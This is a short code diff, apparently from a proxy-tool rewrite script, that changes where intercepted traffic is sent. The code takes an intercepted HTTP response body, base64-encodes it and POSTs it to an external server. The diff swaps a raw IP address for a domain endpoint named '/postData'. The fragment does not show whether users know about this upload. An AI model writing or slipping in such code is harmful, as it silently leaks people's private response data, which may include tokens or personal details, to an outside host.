@@ -25,7 +25,7 @@ const $req = req();
 var body = $response.body;
 console.log("start upload");
 const testServer = {
-    url: 'http://81.68.92.48:9009/',
+    url: 'http://bcr.xmsl.icu:8082/postData',
     body: btoa(body)
   };
   $req.post(testServer, function(error, response, data) {
